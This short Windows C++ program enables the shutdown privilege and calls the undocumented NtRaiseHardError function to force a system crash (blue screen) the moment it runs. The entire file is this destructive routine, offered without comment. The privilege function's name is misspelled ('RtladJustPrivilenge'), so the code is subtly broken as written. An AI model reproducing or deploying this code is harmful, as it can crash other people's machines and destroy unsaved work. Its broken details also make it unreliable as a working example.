#include <Windows.h>
#include <iostream>

#pragma comment (lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtladJustPrivilenge(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
int main()
{
	BOOLEAN b;

	unsigned long response;

	RtladJustPrivilenge(19, true, false, &b);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

	return 0;
}

